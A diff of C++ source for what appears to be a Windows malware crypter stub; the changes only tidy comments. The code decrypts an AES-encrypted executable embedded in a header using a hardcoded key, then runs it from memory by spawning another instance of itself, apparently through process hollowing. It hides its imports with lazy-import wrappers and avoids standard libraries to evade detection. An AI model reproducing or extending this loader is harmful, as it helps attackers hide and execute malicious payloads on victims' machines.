@@ -1,6 +1,3 @@
-// sussy baka.cpp : Définit le point d'entrée de l'application.
-//
-
 #include <windows.h>
 // the header that contains our encrypted executable file (works with 32 bit ones only)
 #include "header1.h"
@@ -20,7 +17,7 @@
 #define ALIGN(size) (((size) + (ALIGNMENT-1)) & ~(ALIGNMENT-1))
 #define SIZE_T_SIZE (ALIGN(sizeof(size_t))) // header size
 
-//custom implementation of memset and memcpy to avoid dependency on the default libraries
+// custom implementation of memset and memcpy to avoid dependency on the default libraries
 
 void* memset2(void* DestInit, int Source, size_t Size)
 {
@@ -40,7 +37,7 @@ void* memcpy2(void* DestInit, void const* SourceInit, size_t Size)
 }
 #define ECB 1
 
-//function to run our exe from another instance of ourselves
+// function to run our exe from another instance of ourselves
 void RunFromMemory(char* pImage, char* pPath)
 {
     DWORD dwWritten = 0;
@@ -132,7 +129,7 @@ void RunFromMemory(char* pImage, char* pPath)
     
   
 }
-//check if we are running on a 64 bit system. if not the case, the code will continue after the wow64enablewow64fsredirection function. this is mainly to prevent our application from crashing on 32 bit systems.
+// check if we are running on a 64 bit system. if not the case, the code will continue after the wow64enablewow64fsredirection function. this is mainly to prevent our application from crashing on 32 bit systems.
 BOOL DisableWowRedirection() {
     SYSTEM_INFO si;
     LI_FN(GetSystemInfo)(&si);
@@ -160,7 +157,7 @@ int main() {
     char me[MAX_PATH];
 	
 	LI_FN(GetModuleFileNameA)(nullptr, me, MAX_PATH);
-    //size of our encrypted exe
+    // size of our encrypted exe
     SIZE_T shellcodeSize = sizeof(rawData);
     // The key and the initialization vector MUST be the same as the one in the winapp project to work.
     unsigned char key[] = "qwertyuiopasdfghjklzxcvbnmqwerty";
@@ -169,7 +166,7 @@ int main() {
     struct AES_ctx ctx;
     AES_init_ctx_iv(&ctx, key , iv);
     AES_CBC_decrypt_buffer(&ctx, rawData, shellcodeSize);
-//actually run our executable
+// actually run our executable
     RunFromMemory(reinterpret_cast<char*>(rawData), me);
 
 }
